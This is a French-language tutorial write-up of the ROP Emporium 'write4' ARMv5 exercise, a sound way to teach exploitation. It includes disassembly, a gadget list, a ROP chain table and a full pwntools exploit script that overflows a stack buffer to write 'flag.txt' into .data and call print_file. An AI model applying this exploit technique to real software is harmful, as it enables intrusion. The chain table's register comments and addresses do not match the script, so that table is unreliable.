---
Title: Ropemporium ARMv5 write4
Date: 2023-06-24
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# armv5 write4

## Introduction

Dans cet exercice on doit appeller une fonction avec en paramètre une chaine de caractère péalablement écrite en mémoire.

Ennoncé sur le site ropemporium : [write4](https://ropemporium.com/challenge/write4.html)


## Analyse

### Le programe principal

LA fonction principale :

    ┌ 24: int main (int argc, char **argv, char **envp);
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105b8      00482de9       push {fp, lr}
    │           0x000105bc      04b08de2       add fp, var_4h
    │           0x000105c0      b1ffffeb       bl sym.imp.pwnme
    │           0x000105c4      0030a0e3       mov r3, 0
    │           0x000105c8      0300a0e1       mov r0, r3
    └           0x000105cc      0088bde8       pop {fp, pc}

Elle appelle directement le fonction vulnérable qui est importée de la librairie, comme nous l'indique le préfix imp de radare2.
L'adresse imp est une adresse de la PLT.

La fonction suivante nous sugère l'appel de la fonction importée `print_file`.

    ┌ 24: sym.usefulFunction ();
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105d0      00482de9       push {fp, lr}
    │           0x000105d4      04b08de2       add fp, var_4h
    │           0x000105d8      08009fe5       ldr r0, str.nonexistent     ; [0x10668:4]=0x656e6f6e ; "nonexistent"
    │           0x000105dc      b3ffffeb       bl sym.imp.print_file
    │           0x000105e0      0000a0e1       mov r0, r0                  ; 0x10668 ; "nonexistent"
    └           0x000105e4      0088bde8       pop {fp, pc}

### La librairie

La fonction vulnérable

    ┌ 180: sym.pwnme ();
    │           ; var void *buf @ fp-0x24
    │           ; var int32_t var_4h_2 @ sp+0x20
    │           ; var int32_t var_4h @ sp+0x24
    │           0x000006e0      00482de9       push {fp, lr}
    │           0x000006e4      04b08de2       add fp, var_4h
    │           0x000006e8      20d04de2       sub sp, sp, 0x20
    │           0x000006ec      a0209fe5       ldr r2, [0x00000794]        ; [0x794:4]=0x10908
    │           0x000006f0      02208fe0       add r2, pc, r2              ; 0x11000 ; " \x0f\x01"
    │           0x000006f4      9c309fe5       ldr r3, aav.0x00000044      ; [0x798:4]=68
    │           0x000006f8      033092e7       ldr r3, [r2, r3]            ; 0x11044
    │                                                                      ; reloc.stdout
    │           0x000006fc      000093e5       ldr r0, [r3]                ; FILE*stream
    │           0x00000700      0030a0e3       mov r3, 0
    │           0x00000704      0220a0e3       mov r2, 2
    │           0x00000708      0010a0e3       mov r1, 0                   ; char *buf
    │           0x0000070c      a1ffffeb       bl sym.imp.setvbuf          ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
    │           0x00000710      84309fe5       ldr r3, aav.0x00000138      ; [0x79c:4]=312
    │           0x00000714      03308fe0       add r3, pc, r3              ; 0x854 ; "write4 by ROP Emporium"
    │           0x00000718      0300a0e1       mov r0, r3                  ; 0x854 ; "write4 by ROP Emporium" ; const char *s
    │           0x0000071c      94ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000720      78309fe5       ldr r3, aav.0x00000140      ; [0x7a0:4]=320
    │           0x00000724      03308fe0       add r3, pc, r3              ; 0x86c ; "ARMv5\n"
    │           0x00000728      0300a0e1       mov r0, r3                  ; 0x86c ; "ARMv5\n" ; const char *s
    │           0x0000072c      90ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000730      24304be2       sub r3, buf
    │           0x00000734      2020a0e3       mov r2, 0x20
    │           0x00000738      0010a0e3       mov r1, 0                   ; int c
    │           0x0000073c      0300a0e1       mov r0, r3                  ; void *s
    │           0x00000740      97ffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
    │           0x00000744      58309fe5       ldr r3, aav.0x00000124      ; [0x7a4:4]=292
    │           0x00000748      03308fe0       add r3, pc, r3              ; 0x874 ; "Go ahead and give me the input already!\n"
    │           0x0000074c      0300a0e1       mov r0, r3                  ;
    │           0x00000750      87ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000754      4c309fe5       ldr r3, aav.0x00000140      ; [0x7a8:4]=320
    │           0x00000758      03308fe0       add r3, pc, r3              ; 0x8a0 ; "> "
    │           0x0000075c      0300a0e1       mov r0, r3                  ;
    │           0x00000760      77ffffeb       bl sym.imp.printf           ; int printf(const char *format)
    │           0x00000764      24304be2       sub r3, buf
    │           0x00000768      022ca0e3       mov r2, 0x200
    │           0x0000076c      0310a0e1       mov r1, r3                  ; void *buf
    │           0x00000770      0000a0e3       mov r0, 0                   ; int fildes
    │           0x00000774      78ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
    │           0x00000778      2c309fe5       ldr r3, aav.0x00000120      ; [0x7ac:4]=288
    │           0x0000077c      03308fe0       add r3, pc, r3              ; 0x8a4 ; "Thank you!"
    │           0x00000780      0300a0e1       mov r0, r3                  ; 0x8a4 ; "Thank you!" ; const char *s
    │           0x00000784      7affffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000788      0000a0e1       mov r0, r0                  ; 0x8a4 ; "Thank you!"
    │           0x0000078c      04d04be2       sub sp, var_4h_2
    └           0x00000790      0088bde8       pop {fp, pc}


La sequence de lecture de stdin nous donne l'offset de débordement : 0x24 pour atteindre la sauvegarde de $fp et

    │           ; var void *buf @ fp-0x24
    │           0x00000768      022ca0e3       mov r2, 0x200
    │           0x0000076c      0310a0e1       mov r1, r3                  ; void *buf
    │           0x00000770      0000a0e3       mov r0, 0                   ; int fildes
    │           0x00000774      78ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)

On lit 0x200 (512) octets donc largement de quoi déborder et placer une grosse charge.

Notre objectif est donc d'ecrire "flag.txt" a une adresse inscriptible, charge cette adresse dans r0 puis apeller `print_file`.

L'adresse de print_file :

    [0x000104c8]> f~imp
    0x00000000 16 loc.imp._ITM_deregisterTMCloneTable
    0x00000000 16 loc.imp._ITM_registerTMCloneTable
    0x0001048c 12 sym.imp.pwnme
    0x00010498 12 sym.imp.__libc_start_main
    0x000104a4 16 loc.imp.__gmon_start__
    0x000104b0 12 sym.imp.print_file  <===
    0x000104bc 12 sym.imp.abort



#### Identification d'une zone inscriptible.

On utilise radare2 pour lister les sections et leus propriétés.

    [0x000006dc]> iS
    [Sections]

    nth paddr        size vaddr       vsize perm name
    ―――――――――――――――――――――――――――――――――――――――――――――――――
    0   0x00000000    0x0 0x00000000    0x0 ----
    1   0x000000f4   0x24 0x000000f4   0x24 -r-- .note.gnu.build-id
    2   0x00000118   0x50 0x00000118   0x50 -r-- .gnu.hash
    3   0x00000168  0x1c0 0x00000168  0x1c0 -r-- .dynsym
    4   0x00000328   0xff 0x00000328   0xff -r-- .dynstr
    5   0x00000428   0x38 0x00000428   0x38 -r-- .gnu.version
    6   0x00000460   0x20 0x00000460   0x20 -r-- .gnu.version_r
    7   0x00000480   0x40 0x00000480   0x40 -r-- .rel.dyn
    8   0x000004c0   0x58 0x000004c0   0x58 -r-- .rel.plt
    9   0x00000518    0xc 0x00000518    0xc -r-x .init
    10  0x00000524   0x98 0x00000524   0x98 -r-x .plt
    11  0x000005bc  0x290 0x000005bc  0x290 -r-x .text
    12  0x0000084c    0x8 0x0000084c    0x8 -r-x .fini
    13  0x00000854   0x79 0x00000854   0x79 -r-- .rodata
    14  0x000008d0    0x4 0x000008d0    0x4 -r-- .eh_frame
    15  0x00000f18    0x4 0x00010f18    0x4 -rw- .init_array
    16  0x00000f1c    0x4 0x00010f1c    0x4 -rw- .fini_array
    17  0x00000f20   0xe0 0x00010f20   0xe0 -rw- .dynamic
    18  0x00001000   0x4c 0x00011000   0x4c -rw- .got
    19  0x0000104c    0x4 0x0001104c    0x4 -rw- .data
    20  0x00001050    0x0 0x00011050    0x4 -rw- .bss
    21  0x00001050   0x30 0x00000000   0x30 ---- .comment
    22  0x00001080   0x28 0x00000000   0x28 ---- .ARM.attributes
    23  0x000010a8  0x5d0 0x00000000  0x5d0 ---- .symtab
    24  0x00001678  0x30e 0x00000000  0x30e ---- .strtab
    25  0x00001986   0xe4 0x00000000   0xe4 ---- .shstrtab

La section data suivie de la section .bss contiennent juste de quoi stocker "flag.txt".


## Construction de la chaine

### Idenfication des gadgets.

Pour charge r0  :

    0x000105f4 : pop {r0, pc}

Pour écrire en memoire.

Requête :

    ROPgadget --binary write4_armv5 |grep str

On retient

    0x000105ec : str r3, [r4] ; pop {r3, r4, pc}

Et pour charger r3 et r4.

    0x000105f0 : pop {r3, r4, pc}


### La chaîne

On doit écrire la chaîne "flag.txt" en deux fois puisqu'on a des registre de 32 bits.

Le gadget d'écriture enchaine sur le gadget de `pop r3,r4` donc on peut anticiper les chargement pour l'écriture suivante.
Et lors de la seconde écriture, prévoir des valeurs sans importance pour le `pop r3,r4`.

| ROP entry | comment |
| ----------- | ------- |
| 0x000105f0 | pop {r3, r4, pc}
| 0x67616c66 | "flag" pour r4 |
| 0x0000104c | .data pour r3|
| 0x000105ec | str r3, [r4] ; pop {r3, r4, pc}
| 0x7478742e | ".txt" pour r4
| 0x00001050 | .data+4 pour r3|
| 0x000105ec | str r3, [r4] ; pop {r3, r4, pc}
| 0x0 | pour r3 sans importance |
| 0x0 | pour r4 sans importance |
| 0x000105f4 | pop {r0, pc} |
| 0x0000104c | .data |
| 0x000104b0 | print_file@plt


## Exploitation


### Le script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('write4_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# pop {r3, r4, pc}
g_pop_r3r4 = 0x000105f0

# str r3, [r4] ; pop {r3, r4, pc}
g_str_r3r4 = 0x000105ec

# pop {r0, pc}
g_pop_r0 = 0x000105f4

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']
main=elf.symbols['main']

log.info(f".data       = 0x{data}")
log.info(f".print_file = 0x{print_file}")

io.recvuntil(b"> ")


offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
PL+=p32(g_pop_r3r4)
PL+=flagfile[:4]
PL+=p32(data)
PL+=p32(g_str_r3r4)
PL+=flagfile[4:8]
PL+=p32(data+4)
PL+=p32(g_str_r3r4)
PL+=p32(0)
PL+=p32(0)
PL+=p32(g_pop_r0)
PL+=p32(data)
PL+=p32(print_file)
PL+=p32(main)


io.sendline(PL)
io.interactive()
```


### Son exécution

    [*] '/home/jce/w/ropemporium/armv5/04_write4/write4_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/armv5/04_write4/write4_armv5': pid 11007
    [*] .data       = 0x135204
    [*] .print_file = 0x66736
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    qemu: uncaught target signal 11 (Segmentation fault) - core dumped
    [*] Got EOF while reading in interactive

Je n'ais pas trouvé comment enchaîner avec adresse propre pour ne pas planter